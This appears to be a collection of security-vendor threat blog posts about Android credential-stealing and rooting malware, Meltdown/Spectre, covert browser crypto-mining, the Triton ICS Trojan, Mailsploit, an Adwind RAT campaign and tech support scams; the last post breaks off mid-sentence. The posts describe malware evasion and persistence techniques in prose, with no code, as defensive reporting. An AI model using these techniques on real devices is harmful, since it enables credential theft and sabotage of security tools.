    "text": "Recently, there have beenreportsof mobile threats stealing Facebook login credentials, such as user names and passwords. We’ve encountered new Android malware (detected asAndroid. Fakeapp) that takes a more aggressive approach: logging into Facebook accounts and harvesting account details directly from victims’ devices. The majority of the victims are located in the Asia-Pacific region. The malware we’ve encountered was sourced from third-party markets. The apps target English speakers. Once installed, the malicious app immediately hides itself from the home screen, leaving only a service running in the background. This service takes the following steps to steal details from a Facebook user’s account: Using JavaScript from a hidden WebView, the threat silently logs into the compromised Facebook account. The malware hides the WebView by setting the display to be almost completely transparent (Figure 2). It then ensures that a CAPTCHA isn’t presented. If it is, it sends the event to the C&C server, clears caches and cookies, and retries later. Once the malware is logged into the Facebook page, it can leverage a wide range of capabilities to follow links and scrape the personal data of the victim and their friends, sending it back to the C&C server. This includes: The functionality that crawls the Facebook page has a surprising level of sophistication. The crawler has the ability to use the search functionality on Facebook and collect the results. Additionally, to harvest information that is shown using dynamic web techniques, the crawler will scroll the page and pull content via Ajax calls (Figures 4 and 5).

    "text": "Update: January 31, 2018 -Symantec has released the following detection for attempts to exploit the Multiple CPU Hardware Information Disclosure Vulnerability (CVE-2017-5754/Meltdown): Update: January 5, 2018 -Symantec has released the following detection for attempts to exploit the Multiple CPU Hardware Information Disclosure Vulnerability (CVE-2017-5753/Spectre): A series of newly discovered vulnerabilities affecting processor chips could permit attackers to gain unauthorized access to a computer’s memory. Dubbed Meltdown and Spectre, the vulnerabilities affect nearly all modern processors and can only be mitigated through operating system patches. Of the two, Meltdown poses the greatest threat because it is easier to exploit and affects all kinds of computers, including personal computers and virtual machines in the cloud. Symantec is not aware of either vulnerability being exploited in the wild. The vulnerabilities are significant, since a successful exploit could allow attackers to gain unauthorized access to sensitive data, including passwords. However, exploit of any vulnerable computer would require an attacker to gain access to the targeted computer via a prior step, such as running a malicious application on it; through JavaScript which triggers an exploit in order to run as native code; or running JavaScript to map the kernel. All of these malicious activities can be blocked by Symantec products. Nevertheless, users are advised to apply operating system patches as soon as they are made available. Both Meltdown and Spectre exploit flaws in processors in order to bypass memory isolation in the operating system. Operating systems are designed in a way to block one application from accessing memory being used by another. If memory isolation fails to work, a malicious application could steal information from memory being used by other applications. Meltdown (CVE-2017-5754) exploits a flaw in out-of-order execution, a performance feature found in many modern processor chips. The researchers who discovered it have confirmed that it affects every Intel processor since 1995 (with the exception of pre-2013 Intel Itanium and Intel Atom processors). However, they added that it remains unclear whether ARM and AMD processors are also affected by the vulnerability. If successfully exploited, an attacker can obtain a copy of the entire kernel address space, including any mapped physical memory, in other words, any data stored in memory at the time of the attack. Meltdown can be exploited regardless of the operating system a computer is running. It affects both individual computers and any computers hosting cloud services, meaning an attack on a single server could lead to the compromise of multiple virtual machines running on that server. Exploitation against cloud services is potentially the most worrying scenario, since the Meltdown can be exploited on a virtual machine in order to access memory from the host machine. Attackers could potentially buy space on a vulnerable cloud service and use it to stage an attack against other customers using the same host. Spectre (CVE-2017-5753andCVE-2017-5715) has a similar outcome but works in a slightly different way, and exploits a flaw in processor design to trick an application into leaking information stored in memory. According to the team who discovered Spectre, virtually all modern processors are affected by the vulnerability, including Intel, AMD, and ARM chips. Once again, the vulnerability is operating system agnostic. Users are advised to apply operating system patches immediately. Patches have already been released forMicrosoft Windows,Apple macOS, andLinuxto patch Meltdown. Spectre is reportedly more difficult to patch but also more difficult to exploit. Work is underway to harden software against any potential exploits. Operating system vendors have already warned that patching is likely to have a performance impact on affected computers. According to Microsoft, the impact may not be noticeable on most consumer devices, however the specific impact “varies by hardware generation and implementation by the chip manufacturer.” The developers of the Linux patch said average performance could decline by 5 percent, but instances of a 30 percent decline were observed.

    "text": "While analyzing the most recentAndroid. Fakeappmalware variants, we came across a sample that was using a quite novel and different monetization technique, in addition to the regular overlay tricks asking users to enter their credit card details. This one would be of particular concern to Uber users on Android, which number in the millions worldwide. The Fakeapp variant we found had a spoofed Uber application user interface (UI) which pops up on the user’s device screen in regular intervals until the user gets tricked into entering their Uber ID (typically the registered phone number) and password. Figure 1 shows the fake Uber app UI displayed by the malware to get the user to enter their details. Once the user clicks the Next button (->), the malware sends the user ID and password to its remote server. Next, the malware tries to cover up the heist. To avoid alarming the user, the malware displays a screen of the legitimate app that shows the user’s current location, which would not normally arouse suspicion because that’s what’s expected of the actual app. This is where creators of this Fakeapp variant got creative. To show the said screen, the malware uses the deep link URI of the legitimate app that starts the app’s Ride Request activity, with the current location of the victim preloaded as the pickup point. To show the said screen, the malware uses the deep link URI of the legitimate app that starts the app’s Ride Request activity, with the current location of the victim preloaded as the pickup point. Deep links are URLs that take users directly to specific content in an app. Deep linking in Android is a way to identify a specific piece of content or functionality inside an app. It is much like a web URL, but for applications. For example, the Uber app has the following deep link URI for its Ride Request activity: Figure 3 illustrates the code snippet of the malware that fires the VIEW intent with the Ride Request deep link URI after exfiltrating the Uber credentials to its remote server. This case again demonstrates malware authors’ neverending quest for finding new social engineering techniques to trick and steal from unwitting users.

    "text": "Browser-based cryptocurrency mining activity exploded in the last few months of 2017. After many years of deathly silence, the catalyst appears to be the launch of a new browser-based mining service in September by Coinhive. This service wraps everything up nicely in an easy-to-use package for website owners and has injected new life into an idea that was long thought of as dead and buried. Browser-based mining, as its name suggests, is a method of cryptocurrency mining that happens inside a browser and is implemented using scripting language. This is different compared to the more widely known file-based cryptocurrency mining approach which involves downloading and running a dedicated executable file. Browser-based mining dates back to May of 2011 when an innovative service called BitcoinPlus.com was initially launched—back when Bitcoin was cheap and mining was easy—not to be confused with another cryptocurrency known as Bitcoin Plus.org (XBC). That service was in many ways remarkably similar to its modern reincarnation, Coinhive. It used JavaScript code for pooled mining and website owners could sign up to the service and embed these scripts into their web pages to make page visitors mine for them. The big difference is that back in 2011 BitcoinPlus.com, as its name suggests, mined for Bitcoin (BTC) whereas the current browser-based miners like Coinhive are mining for Monero (XMR)—a newer, privacy-focused cryptocurrency. Back in 2011, before theadvent of ASIC mining in 2013, Bitcoin was still in its infancy,mining difficultywas relatively low, and cryptocurrency prices were even lower. It was (just about) possible to do some mining with home-grade hardware. Even though it was possible at that time to mine for Bitcoin via BitcoinPlus.com, the reality of the situation was that it was largely a futile exercise. The reward was minuscule compared to the amount of mining power and electricity required. Of course, this was back in the days before Bitcoin prices shot through the roof—in June 2011, Bitcoin reached the then lofty heights of almost US$30. Due to this fundamental profitability problem with browser-based mining, it soon withered away. However, the idea was once again revived in December 2013 by a group of MIT students in a project called Tidbit—ostensibly touted as an alternative way for website owners to raise revenue. Once again, this project didn’t last long, as soon after it started the New Jersey Division of Consumer Affairs stepped in to investigate the fledgling company on charges of unlawful access to \"a person’s computer processing power.\" This resulted ina long drawn out case which was finally settled in 2015. The case for browser-based mining wasn’t looking good. The growing problem of profitability was made even worse by the increasing use of ASIC miners. The advent of ASIC miners dragged bitcoin mining out of the realm of home users and into an industrial age dominated by the massive mining farms that we are more familiar with today. After the demise of Tidbit, the idea of browser-based JavaScript cryptocurrency mining largely died away once again. Despite these setbacks, key lessons were learned. The point of a service like Tidbit was never about single servers or high-end computers doing solo mining. The true power of this service came from scaling up and pooling the potentially massive combined mining power of masses of users with average hardware visiting a website. Higher website traffic means higher returns and sooner or later, somebody was bound to figure out a better way to get browser mining to work on end users' computers more efficiently. Fast forward to September 2017, the cryptocurrency landscape compared with 2013 had changed drastically. In April 2013, the cryptocurrency market only had a handful of coins and the total market capitalization was just $1.5 billion. The market for cryptocurrency was extremely limited and illiquid, meaning that even if you got some, it was not easy to turn it back into fiat currency for spending. Contrast that withSeptember 2017 when the market capitalization stood at an incredible $166billion spread over more than a thousand different coins. Together with the diversity of coins to choose from in 2017, there was also now a diversity of coin reward mechanisms. Some, like Bitcoin, can still only be mined via a proof-of-work (PoW) process using dedicated power-hungry ASIC hardware—though there have been attempts to change this, with the various hard forks such as Bitcoin Gold (BTG) and Bitcoin Diamond (BCD), to bring in GPU mining. Other cryptocurrencies like Monero, Ethereum (ETH), Ethereum Classic (ETC), and Dash (DASH) can be mined using retail-grade GPU hardware found in many home computers. There are also some that are more suited to CPU mining; these include Monero and Verium Reserve (VRM). The trading environment is massively different too; it’s now much easier to move between fiat currencies and cryptocurrencies, making the latter more useful and valuable. It's against this backdrop that Coinhive released its browser-mining scripts designed to mine Monero, effectively bringing the idea of browser-based mining back from the dead. Coinhive is marketed as an alternative to browser ad revenue. The motivation behind this is simple: users pay for the content indirectly by coin mining when they visit the site and website owners don't have to bother users with sites laden with ads, trackers, and all the associated paraphernalia being downloaded to the browser. Users hopefully then get a cleaner, faster, and potentially less risky website (remember malvertising?) to use, and everybody is happy. What could go wrong? Soon after the release of the Coinhive service, the hash rate for the service started to climb, and quickly too. Hash rate is the number of hashes calculated by the combined power of the mining pool and is measured in the number of hashes per second—usually in units of millions (MH/s). Hashing is the process of carrying out cryptographic hash calculations which are used to help process transactions. Miners who participate in a mining pool get paid a share of income generated by the pool. According to a blog by Coinhive, the hash rate for their pool climbed from 0 MH/s to 3 MH/s in a couple of days before reaching 13.5 MH/s in the space of a week. To put that into perspective, the total network hash rate (the total amount of mining power for all computers mining) for Monero stood at around 260 MH/s on September 20, 2017. The Coinhive pool reached just over five percent of that total which is quite an achievement in such a short time. Monero can be mined with CPUs and GPUs, but the Coinhive browser-based mining service only works for CPU mining which is a limitation that substantially reduces potential returns. To maximize revenue, the script is best placed on high-traffic websites and \"sticky\" websites (where users stay on the same page for longer). According to one early adopter,the revenue generated by his particular site was far lower than the revenue generated from ads. In fairness to Coinhive, it recommends being transparent with site visitors and that website owners notify users of the mining that will be taking place and, better still, offer users a way to opt in. Unfortunately, despite Coinhive’s best intentions, unscrupulous operators quickly latched on to the idea of secret mining in the hope that users will not notice. The first high-profile site to start using Coinhive mining was The Pirate Bay torrent website. The Pirate Bay has had a checkered history and, being a highly trafficked site (global ranking #161 with 290 million visitors in the last six months), has been looking for alternative ways to monetize its considerable traffic. Its initial attempts at browser mining were quickly spotted by users and they were not too happy about it. At least in the case of The Pirate Bay, this was a case of the site's owners making a decision to use Coinhive. The Pirate Bay's initial attempts at browser mining were quickly spotted by users and they were not too happy about it. The Pirate Bay was soon followed by another high-profile site—this time Coinhive's miner wasfound on two of Showtime's websites. One of the Showtime sites affected was its content streaming site which has high traffic and user sessions are lengthy as visitors stay on the site while content is streaming. Showtime is a premium-based service so it would seem strange that users are made to pay twice for content. The scripts were promptly removed after they were discovered, suggesting that they were planted there maliciously. Reports of many other sites using the Coinhive mining scripts soon followed. Over the Thanksgiving holiday in the U. S.,the Coinhive miner was also found in a LiveHelpNow widgetwhich is used by many websites around the world to offer in-browser support chat sessions. The apparent cause of this was the compromise of one of the CDN servers used by LiveHelpNow to serve up its widget. As with Showtime, LiveHelpNow is already a legitimate revenue-generating business and there's no obvious reason as to why it would risk user confidence to earn a few extra bucks from users. So the most likely scenario is that the server was compromised either by an outsider, or even an insider. Browser mining is cropping up in many other different places too: There are many reasons why browser-based mining is back with a vengeance. Unlike in previous failed attempts, recent developments in the cryptocurrency and threat landscapes have made this a much more viable activity. Let's have a look at some of these factors in more detail: Privacy is important if you want to mine coins maliciously, in order to ensure others cannot easily follow the money trail back to you. Monero, which came to the market in 2014, can offer a high level of transaction privacy. Unlike with most other cryptocurrencies that use public transparent blockchains where transaction addresses can be easily viewed by anyone, Monero does things differently. By default, everything is private, including the amount in a transaction, who sent it, and who received it. There is an option with whichwallet owners can selectively reveal some information via what's called a view key, but this is not a feature that cyber criminals are likely to want to use. As mentioned earlier, Coinhive provides a very neat and easy-to-use package for people to get involved in Monero mining. All you have to do is add a few lines of script to your website code. You don't have to make website visitors download and install executable files. The mining process can start quickly and quietly in the browser without anybody noticing, unless insufficient throttling is used, in which case the CPU load may max out during the users' session which would be an easy tell-tale for end users to spot. CPU load may max out during the users' session which would be an easy tell-tale for end users to spot. Even with the price of Monero reaching over $300 recently, given the current network hash power of the network at around 300 MH/s, profitable mining is a game of scale and requires a careful eye on costs. With browser-based mining, the cost of mining is borne mostly by the website visitors through hardware wear and tear as well as energy costs. Scale is achieved by using high-traffic sites with sticky content. Coinhive currently pays 0.000104 XMR ($0.025) for every million hashes. Take for example a user of a PC with a mid-range Intel i7-7700K CPU which is capable of pushing out around 300 H/s. The user would have to spend 3,333 seconds on the site, or roughly 55 minutes, in order to achieve a million hashes. However, if you can get 3,333 users to spend approximately one second each on the site it would achieve a similar result. Even under optimal conditions, the amount of hashes produced in each instance will be small, but when it comes to distributed computing power, it's all about scale and every little bit adds up. As we noted earlier, the value of mining rewards are not great, at least not initially. To get a better understanding, we need to look at the profitability of this activity over the longer term and take in the macroeconomic picture to get a true sense of the reward. The value of cryptocurrencies like Monero is going up dramatically. So far in 2017, the price has gone from $13 to over $300. Under these circumstances where the price of Monero can go up substantially in dollar terms over a relatively short time, mining Monero can become an attractive proposition. A small amount of Monero mined today could potentially be worth a great deal more in a matter of months (conversely it could also drop significantly depending on the health of the overall cryptocurrency economy). Mirroring the rising interest and price of cryptocurrency, we have also seen a big jump in our detections of both file- and browser-based cryptocurrency mining activity in recent months. Malicious cryptocurrency mining isn't just confined to desktop computers and servers. Always-connected mobile devices are also a growing target. We have even seen growth in coin mining on mobile phones in recent years. In 2016, we discovered 26 different Android apps that were mining cryptocurrencies. So far in 2017 we have found 35, which is around a 34 percent increase. Modern mobile phones have processors that can beas powerful as low- to mid-range desktop computerswhich help to make mobile mining more viable. But cryptocurrency mining is always an energy-intensive activity so the biggest problem facing mobile mining is of course battery drain as battery technology has not progressed as fast as processing power. Mobile mining will inevitably be noticed by the heat generated and the fast-draining battery, not to mention any performance impacts that it may also have on the device. If we consider the cryptocurrency market as whole, we can see that just as the total value of cryptocurrencies increased manifold during the year, interest in malicious mining activity, both browser- and executable-based as indicated by detections of malicious mining activity, increased in tandem with it. As interest increases, more participants, both as miners and tool makers, join the fray. Coinhive, while being the best known at this time, doesn't have the market to itself. Similar projects like Crypto Loot are cropping up, and other browser mining projects like JSEcoin have been in beta since August 2017 and are trying to generate growth in this activity. Symantec has observed a significant jump in all cryptocurrency mining activity in recent months as evidenced in our increasing detection rate (See Figures 4 and 5). Despite the genuine aspirations of most browser mining projects to offer a real and potentially better alternative to traditional web revenue generation methods, the sad reality is, it can and is being misused. Increasing user awareness and detection by security vendors will trigger a new arms race between cyber criminals and defenders. Recent innovations in the malicious use of browser-based mining scripts, such as the\"pop-under\" techniquewhere browser mining takes place in a hidden browser window, are a sign of this in action. We can expect to see adoption of a wide range of traditional malware propagation and evasion techniques to help spread and prolong mining activity in order to maximize profit. For as long as the current enabling factors are in place making it favorable for mining, we can expect to see interest in browser mining to be sustained or even increase in the short to medium term. Symantec is keeping a watchful eye on the growing trend of browser mining. We are making adjustments as necessary to prevent unwanted cryptocurrency miners from stealing your computing resources to enrich others. Website owners should watch for injection of the browser-mining scripts into their website source code. Our network solutions can help you spot this in the network traffic as your server communicates with visitors. In addition, file system scans can also show up any files where the browser-based miner code has been injected, enabling you to identify and clean up the content. Symantec helps prevent others from stealing your computing resources by protecting various stages of the attack chain: All mining software, whether it is file- or browser-based, must be able to connect to either the cryptocurrency network or a mining pool to exchange data, in other words its proof-of-work. Without this connection, it cannot get the data it needs to generate hashes, rendering it useless. We can also block the mining scripts from being downloaded in the first instance. Our network protection operates on our endpoint solutions as well as our gateway and cloud touch points; all these solutions help build a solid defense against unwanted mining activity. Here are some of the network protection signatures geared towards detection of browser-based mining: Our endpoint solutions, including those for mobile devices, can detect and block all types of mining activity whether they are file-based or in-browser. These solutions can prevent mining software from installing or running in the first instance. Browser-based mining scripts are detected asPUA. JScoinminer.

    "text": "Symantec is aware of a new Trojan which targets industrial control systems (ICS) and has the potential to cause severe disruption at any targeted organization. Triton (Trojan. Trisis), is designed to communicate with a specific type of ICS, namely safety instrumented systems (SIS) and deploy alternative logic to these devices, meaning they may not function correctly. Triton has reportedly been used against at least one organization in the Middle East. Triton, which has been in existence since at least August 2017, works by infecting a Windows computer that is expected to be connected to a SIS device. The malware then injects code modifying the behavior of the SIS device. However, at present the intended effect is unclear and investigation is still underway. Safety instrumented systems are a type of industrial control system designed to monitor the performance of critical systems and take remedial action should an unsafe condition be detected. This could include overly high temperatures or pressure readings in industrial systems. The SIS is designed to detect such conditions and initiate action that will put the affected systems into a safe state. Attacks on SIS devices could potentially cause disruption at a targeted organization and, at worst, facilitate sabotage. By interfering with the operation of an SIS, an attacker could cause it to malfunction and shutdown operations at a plant. A worst case scenario is an attack where an SIS malfunctions, does not detect an unsafe event and therefore fails to prevent an industrial accident. The latter would be more difficult to accomplish since the attacker would need to ensure an unsafe condition occurs while the SIS is malfunctioning. While there have been a small number previous cases of malware designed to attack ICS, Triton is the first to attack SIS devices. The first and most notable example of ICS malware was Stuxnet (W32. Stuxnet) which wasdesigned to attack programmable logic controllers (PLCs)being used in the Iranian uranium enrichment program. The Dragonfly cyber espionage grouphas also been known to target ICSand previously compromised a number of ICS equipment providers, infecting their software with the Oldrea Trojan (Backdoor. Oldrea) (aka Havex). More recently, the Disakil disk-wiping malware (Trojan. Disakil), which wasused in attacks against the Ukrainian energy sector in late 2016, contained a component designed to target SCADA (supervisory control and data acquisition) ICS systems. The malware attempted to stop and delete a service used by software designed to communicate with legacy SCADA systems. Triton appears to be designed to be used in a highly targeted fashion, meaning it is possible the attackers may be focused on one specific target or a small number of targets. Nevertheless, users of SIS devices are advised to review operational security and follow the manufacturer’s best practices, such as ensuring safety systems are deployed on isolated networks and no unauthorized persons have access to SIS devices. Symantec is continuing to investigate this threat. Symantec has the following protection in place to protect customers against these attacks: Symantec IOTCritical System Protectionalso blocks this threat.

    "text": "A newly discovered exploitaffects more than 30 widely used email applications, could allow attackers to spoof sender addressesand, in some cases, carry out cross site scripting (XSS) and code injection attacks. “Mailsploit” is the collective name for several vulnerabilities affecting email clients, including Microsoft Outlook 2016, Mail for Windows 10, Apple Mail (including macOS, iOS, and watchOS versions), Mozilla Thunderbird, and Yahoo Mail for iOS and Android. Mailsploit was discovered by security researcher Sabri Haddouche, who published his findings on Tuesday December 5. Haddouche said Mailsploit had been found and confirmed in 33 different products. If successfully exploited, Mailsploit allows an attacker to falsify the address an email appears to come from. It takes advantage of a flawed implementation of RFC-1342, a 25-year-old recommendation for displaying non-ASCII text in mail headers, and allows an attacker to create headers that insert various bytes into the “from” line in an attempt to mask the true sender. This could allow an attacker to increase their chances of successfully delivering a malicious email to a target since the recipient is more likely to open it if it appears to come from a trusted source. Spoofing email headers was once a fairly trivial thing to do, but the practice was curtailed by the rollout of new safeguards such as Domain-based Message Authentication, Reporting and Conformance (DMARC). Mailsploit could allow an attacker to create a spoofed email that will bypass DMARC. Additionally, in the case of some affected email clients, Mailsploit also permits code injection and cross XSS attacks. These include Spark, a mail client for MacOS and iOS, MacOS clients Polymail and Airmail, and mobile apps TypeApp and AquaMail. To date, Mailsploit has been patched in eight products and triaged on 12 more products. Two vendors—Mozilla and Opera—said they won’t fix the bug because they consider it to be a server-side problem. Apple Mail, Mail for Windows, and Outlook 2016 are all listed as triaged. The bug has been fixed in Yahoo Mail for iOS and Android. A full list of affected products and mitigation status isavailable here. Symantec Email Security.cloud and Symantec Messaging Gateway (SMG) message filtering are not affected by any of the vulnerabilities reported atwww.mailsploit.com. For general message handling and sender authentication, we do not attempt to decode the local part of the “From” header’s email address. Symantec products are also not susceptible to the XSS/Code Injection portion of the vulnerabilities.

    "text": "In August 2017, we began to see a surge of emails that were tied to the Adwind remote access Trojan (RAT). This increased activity led to a peak in October 2017, when we observed a large spike in the number of emails—totaling over 1.5 million—all attempting to deliver several variants of Adwind. In November, Symantec blocked over 1.3 million malicious emails related to this threat, this represents a small dip from October but the activity trend is still definitely upwards. Adwind (Backdoor. Adwind) is a cross-platform, multifunctional RAT also known as AlienSpy, Frutas, Unrecom, Sockrat, JSocket, and jRAT. It was first discovered in 2013 and can be used for logging keystrokes, using the webcam, stealing information, downloading potentially malicious files, as well as a host of other nasty activities. This high-volume campaign kicked off just in time for the holiday/shopping season, and the timing could be designed to give attackers more time to use any stolen credentials, as victims may let their guard down because they are more relaxed and engaged with other festive activities during this time. The emails spreading Adwind come with JAR or ZIP file attachments. There was a surge in the number of malicious JAR files detected by Symantec, which peaked in October but actually began in August. The increase in malicious JAR detections corresponds with the recent Adwind campaign. The number of malicious JARs jumped from just over 840,000 in July to almost 1,272,000 in August. October saw 1.55 million, and November saw over 1.3 million detected. The email surge that began in August is now well established, with the average volume now well above one million emails a month. The Adwind-spreading emails in this recent campaign are made to look like they originate from various service providers from industry sectors such as finance, telecoms, software, and logistics. The emails come with subject lines containing keywords such as “Account statement”, “payment”, and “PURCHASE ORDER”. In some instances the email used (Figure.2) is made to look like it came from a well-known logistics firm. The email looks very convincing and could fool the recipient into thinking it is legitimate, however the email attachment tells a different story. The file is a fake shipping invoice made to look like a PDF file but is actually a JAR file containing the Adwind malware. Other convincing emails appear to come from financial institutions, and some contain two attachments in case someone suspects that the JAR file may be malicious. The Adwind RAT has been around for quite some time but, in an effort to remain undetected, new variants contain very few identifiable strings and use a convoluted scheme involving layer upon layer of obfuscated function calls and classes wrapped inside numerous JAR files. The wrapper file used in this campaign has multiple packages and classes with nested function calls within these multiple classes. The packages contain AES encrypted binary files with different extensions, such as .dll, .bin, and .so, to disguise themselves. All three variants shown in Figure.3 are different in terms of obfuscation but the functionality remains the same. Once executed, the JAR files drop a payload JAR file with a random name and extension. The payload JAR is dropped in a randomly named directory and executed. The threat then runs VBS scripts in order to fingerprint the compromised computer. It also uses the Windows Management Instrumentation (WMI) interface to get details of any installed firewall or security products. The threat then sets registry entries to disable System Restore and set Image File Execution Options for many security products and reversing tools to svchost.exe so that the tools cannot start. It also starts ending processes related to monitoring tools. The threat also connects to its command and control (C&C) server (we observed Adwind connecting with 174[.]127[.]99[.]211 but similar IP address ranges have also been used). The payload JAR is similar to previous versions of Adwind and can be decompiled and reverse engineered using Bytecode Viewer or Java Decompiler and freely available Adwind decryptors. The important files here are those that provide further information on the threat’s configuration: The configuration file points to yet more files specified by the SERVER_PATH, PASSWORD_CRYPTED, and PRIVATE_PASSWORD keys. These keys represents the following attributes: We can use these additional files to isolate the core Adwind RAT tool and decompile it to check the core functionalities. Figure.6 is what we eventually find in the core of Adwind. Looking even deeper into the JAR file, we can see operating system specific implementations (Adwind can work on macOS, Windows, and Linux), and utility classes containing code to execute other files, open shells, and carry out other activities. The resources directory of decrypted.jar contains a set of files that are used to decrypt the contents of config.json. This file contains configuration details (Figure.7) with information on network, path, user, and VMware, among other things. After all the layers of obfuscation are peeled back, what we are left with is Adwind. And Adwind is really a cross-platform malware that can monitor user activity, take screenshots, log keystrokes, record video and audio, and much more. This latest spam campaign spreading yet another variant of the RAT shows that the criminals behind it are constantly changing their tactics to evade detection.

    "text": "Some of the key takeaways fromNovember’s Latest Intelligence, and the threat landscape in general, include increases in spam and phishing rates surrounding key shopping dates, new Android malware, and new research published regarding an attack group. The spam rate increased in November, up 0.6 percentage points from October, following back-to-back months where the rate declined. At 55.5 percent, this is the highest spam rate seen since March 2015. The month of November tends to come with elevated spam rates, having had the highest rate for 2016 and second-highest in 2015. Given how major shopping events in November, such as Black Friday, Cyber Monday, andSingles Day, tend to lead to an increase in email spam, these increases likely come as little surprise. In fact, over the Black Friday to Cyber Monday weekend,the Necurs botnet appears to have sent out a massive volume of spam. The particular campaign appears to be an attempt to compromise the email recipients’ computers with ransomware. The phishing rate also increased in November, where 1 in every 2,560 emails was a phishing attempt. This is the first monthly increase in the rate seen since it reached a 12-month high back in July of this year. One particular scam seen in the lead up to Black Fridayinvolved SMS and messaging apps, where the messages appear to come from legitimate companies. However, rather than legitimate offers, these messages attempt to steal personal information from the unsuspecting recipient. There were three new Android malware threats seen in November. Tying again into the holiday shopping period, two of these threats—Android. DoublehiddenandAndroid. Fakeyouwon—display advertisements and present fake offers, respectively. The third threat,Android. Rootnik. B, installs a rootkit on the compromised device. The email malware rate declined slightly in November, dropping from 1 in 355 emails to 1 in 505. This is the lowest rate seen since April, 2017 and declines were seen across all industry sectors and organization sizes. In November, Symantec identifiedan attack group targeting specific organizations in South America and Southeast Asia. Dubbed Sowbug, the group has been observed stealing documents from the organizations that it manages to break into, most of which appear to be foreign policy and diplomatic targets. This is just a snapshot of the news for the month. Check out theLatest Intelligencefor the big picture of the threat landscape with more charts, tables, and analysis.

    "text": "We have uncovered a new Android Trojan that uses several techniques to hide itself on devices, and remain in the Google Play Store. The malicious app collects device information and displays advertisements. However the functionality and behavior of this app could be easily extended to a wide range of other malicious purposes. The malware (Android. Doublehidden) is localized in the Persian language. Its name translates to ‘Photograph by Fiery’and it has a package name of com.aseee.apptec.treeapp. The pattern of availability of this malicious app on Google Play suggests the author is attempting to remain under the radar. During October and November 2017, the app has been updated five times, alternating between a working legitimate photo editing app, and this self-hiding malicious non-app. As far as we can tell, the app developer ‘i.r.r developer’ publishes several other apps which are legitimate. The app presents itself as a photo editing app, but immediately dupes the user and hides itself on installation. On launch, the app asks the user for Device Administrator permissions—awell-used approachfor malware to gain a strong foothold on the device. In the subsequent user interface (UI) screen, the app displays a message which roughly translates as: “Unfortunately, this app does not work on your phone. After exiting, the application will be deleted.” Although the app closes, the malicious functionality is already in place. The app hides itself on the device using the following techniques: The app calls setComponentEnableSetting(). Once the app launches, it disappears from the app launcher (its icon no longer appears on the home screen). The app leverages its position on the victim’s device to collect data and advertising revenue. The app collects user information to send to the malware authors. Google Cloud Messaging is used to push configuration information, including when to collect data and where to send it. The malware may collect the following information: If the user gave the malicious application the Device Administrator permission, it will be more difficult to remove. The malware also requests and displays advertisements on the device including suggestions for additional applications by using the OneSignal notification network. If the user gave the malicious application the Device Administrator permission, it will be more difficult to remove, as the user will have to disable ‘Device Administrator’ for the app in the app settings (and remember, this entry is a blank row) to actually uninstall it.

    "text": "We recently discovered a malicious toolkit (detected asAndroid. Rootnik. B) masquerading as pornographic apps in the thousands, which are primarily targeted at Chinese-speaking users. This toolkit has a broad range of capabilities, including: The apps find their way onto devices via app-centric websites, forums, and torrent sites. These can also spread over popular social messaging networks. This malware hides its primary malicious payload in a fake .tiff image in the resources of the application. The payload downloads other malicious components from a set of helper web servers. The malware sets immutable flags (atechnique laid out in a previous blog) to protect the files from being deleted by a savvy user or an antivirus application. The threat also attempts to replacedebuggerd, a key service that enables it to survive cleaning attempts by antivirus applications, or even more aggressive cleaning measures such as a factory reset. The malware decrypts and dynamically loads the hidden payload (detected asAndroid. Reputation.1). It decrypts the following command and control (C&C) URLs and queries them to get root-relevant configurations: The following is a sample response that tells the malware where to download the rootkits, when to start a root attempt, how many retry attempts to make if the attempt fails, and the metadata for the rootkit itself: After gaining root privileges, the malware selects a good candidate process (such as a system process or an app-store process) into which it can inject malicious code. The injected code launches a UNIX domain server socket, and listens for commands to trigger methods. Any malicious client entity (an app on the device) can now command the infected process to carry out malicious activities on its behalf, including sending premium-rate messages. The malware also silently downloads and installs a known malicious app namedister59.apk(detected asAndroid. Reputation.3) from the following URL: It can download and dynamically load other payloads from the following URLs without the user’s consent: Moreover, it subscribes to premium services and sends premium text messages. It requests ads and pushes other malicious apps. All devices with Android API level 8 (2.2) or greater are affected. Even if some devices with higher platform versions cannot be rooted, the malware still sends premium-rate messages. In this case, the malware falls back to premium-rate scamming, as it cannot inject or install malware. Furthermore, the malware code is highly modularized, which means it can be easily repackaged into any other popular apps. In addition, the malware is protected by a private packer, asoutlined in a previous post. The malicious code is obfuscated and the key strings are encrypted, thwarting base-level forms of static analysis and detection. Symantec recommends mobile users observe the following security best practices: Symantec and Norton products detect the malware as well as related threats discussed in this blog as the following: Martin is a member of Symantec’s Security Technology and Response team who are focused on providing round-the-clock protection against current and future cyber threats.

    "text": "In my lastpost, I discussed the evolution of tech support scams and their growing penchant towards the use of code obfuscation to hide their malicious activity behind heaps of obfuscated JavaScript code. This growing trend was an endeavor, undertaken with a single and simple objective in mind: to avoid detection by string-based detection engines employed by various security vendors. This allowed the attackers behind these fake scams to remain under the radar and still be as effective as ever. Since then, a year has passed and a lot of water has flowed under the bridge. The threat landscape has witnessed a lot of significant changes, some of which include the introduction ofJavaScript-based coin miners, malware (in particular ransomware)exploiting vulnerabilities in Microsoft’s implementation of the Server Message Block(SMB) protocol to spread, and the continuing decline in exploit kit activity. But where do tech support scams stand in today’s threat landscape? As it turns out, tech support scams have got meaner, adding new anti-detection techniques to their arsenal. Over the past year, there has been a growing trend towards so-called “living off the land” tactics, which involves attackers using tools and technologies already installed on target computers. The main benefits behind using this approach are twofold: the attacker can target a larger pool of victims (as most of the users have these tools installed by default or use these technologies frequently), and at the same time keep a low profile (as these tools are not inherently malicious, using them is unlikely to trigger any alarms). In this blog post, I will describe how tech support scams have embraced this approach by making use of the Advanced Encryption Standard (AES) specification algorithm to obfuscate their scam content. Advanced Encryption Standard orAESis an encryption algorithm used to encrypt sensitive electronic data so as to protect it from unintended third-party use while the data is stored or is in transit. AES is fast in both software and hardware and is the first (and only) publicly accessible algorithm approved by the National Security Agency (NSA). Now tech support scams are following the trend and are using the AES encryption algorithm as an anti-detection mechanism. While I’m not going to deep dive into the intricacies of this algorithm, the fact that it allows for strong data encryption, and is in widespread use around the world to secure sensitive data, makes it an ideal candidate for living off the land attacks. We have already witnessed this algorithm being used in various ransomware threats, such as TorrentLocker (Ransom. TorrentLocker) and TeslaCrypt (Trojan. Cryptolocker. N), and in other attacks such as in phishing kits. Now tech support scams are following the trend and are using the AES encryption algorithm as an anti-detection mechanism. The scam is initiated when an unsuspecting user visits a malicious website or is redirected to one by various means such as a malvertisement or compromised website. The scam web page informs the victim that the license key file has been deleted from the computer due to a malware infection and tries to lure the user into calling a “Toll free” number for assistance. An audio file, stating that the computer is infected, is also played in the background when the user arrives on the scam web page. A first look through the source code for the scam web page reveals the piece of code responsible for 